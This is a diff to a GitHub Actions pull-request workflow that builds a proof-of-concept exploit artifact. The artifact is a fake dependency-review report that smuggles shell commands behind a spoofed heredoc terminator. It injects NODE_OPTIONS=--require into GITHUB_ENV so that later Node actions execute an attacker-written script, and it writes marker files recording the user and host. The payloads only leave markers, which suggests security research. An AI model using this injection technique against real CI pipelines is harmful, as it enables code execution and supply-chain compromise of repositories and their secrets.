@@ -2,7 +2,25 @@ name: PR Workflow
 on:
   pull_request:
 jobs:
-  build:
+  forge:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "base upstream PR workflow placeholder"
+      - name: Build attacker-controlled dependency graph artifact
+        run: |
+          mkdir -p dependency-graph-reports
+          cat > dependency-graph-reports/report.txt <<'PAYLOAD'
+          <h1>Dependency Review</h1>
+          <h2>Scanned Files</h2>
+          <ul><li>settings.gradle
+          EOF
+          echo "shell-exec-marker=$(id -un)@$(hostname)" > /tmp/gab_rce_marker
+          echo 'NODE_OPTIONS=--require /tmp/gab_require.js' >> "$GITHUB_ENV"
+          printf '%s\n' "require('fs').writeFileSync('/tmp/gab_node_marker','NODE_OPTIONS require executed in a subsequent node action');" > /tmp/gab_require.js
+          exit 0
+          </li></ul>
+          PAYLOAD
+          echo "payload bytes: $(wc -c < dependency-graph-reports/report.txt)"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc.json
+          path: dependency-graph-reports/report.txt
